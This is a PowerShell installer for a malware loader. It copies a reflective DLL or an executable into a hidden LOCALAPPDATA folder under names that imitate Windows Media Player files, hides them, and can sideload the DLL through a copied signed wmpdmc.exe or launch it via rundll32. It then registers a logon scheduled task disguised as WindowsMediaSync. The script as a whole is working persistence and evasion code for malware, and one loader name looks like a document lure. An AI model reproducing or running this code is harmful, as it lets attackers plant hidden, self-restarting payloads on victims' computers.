<#
.SYNOPSIS
    Install the loader artifacts and a logon task.
.DESCRIPTION
    -Dll  : reflective DLL. Default chain: rundll32.exe loads wmpdui.dll,Run
            (signed host, in-memory payload). -UseWmpHost drops the signed
            wmpdmc.exe beside it (classic sideload).
    -Exe  : temp-exec loader. Copied as wmpsync.exe, task runs it with
            --no-install (no self-copy, no Run key).
.PARAMETER Dll
    Path to the built wmpdui.dll (reflective).
.PARAMETER Exe
    Path to the temp-exec loader (loader.exe / Sənədlər.exe).
.PARAMETER TaskName
    Scheduled task base name (default WindowsMediaSync).
.PARAMETER UseWmpHost
    Use the wmpdmc.exe + wmpdui.dll sideload chain instead of rundll32.
#>
param(
    [string]$Dll = "",
    [string]$Exe = "",
    [string]$TaskName = "WindowsMediaSync",
    [switch]$UseWmpHost
)
$ErrorActionPreference = "Stop"
$dir = Join-Path $env:LOCALAPPDATA "WMProcess"
New-Item -ItemType Directory -Force -Path $dir | Out-Null

if ($Dll -ne "") {
    if (-not (Test-Path $Dll)) { throw "DLL not found: $Dll" }
    $targetDll = Join-Path $dir "wmpdui.dll"
    Copy-Item $Dll $targetDll -Force
    attrib +h $targetDll 2>$null | Out-Null
    if ($UseWmpHost) {
        $hostExe = Join-Path $dir "wmpdmc.exe"
        Copy-Item "$env:SystemRoot\System32\wmpdmc.exe" $hostExe -Force
        attrib +h $hostExe 2>$null | Out-Null
        $run = "`"$hostExe`""
    } else {
        $run = "`"$env:SystemRoot\System32\rundll32.exe`" `"$targetDll`",Run"
    }
    schtasks.exe /Create /TN $TaskName /TR $run /SC ONLOGON /RL LIMITED /F | Out-Null
    Write-Host "[+] dll  : $targetDll"
    Write-Host "[+] task : $TaskName"
    Write-Host "[+] run  : $run"
}

if ($Exe -ne "") {
    if (-not (Test-Path $Exe)) { throw "EXE not found: $Exe" }
    $targetExe = Join-Path $dir "wmpsync.exe"
    Copy-Item $Exe $targetExe -Force
    attrib +h $targetExe 2>$null | Out-Null
    $run = "`"$targetExe`" --no-install"
    $task = "$TaskName-sync"
    schtasks.exe /Create /TN $task /TR $run /SC ONLOGON /RL LIMITED /F | Out-Null
    Write-Host "[+] exe  : $targetExe"
    Write-Host "[+] task : $task"
    Write-Host "[+] run  : $run"
}
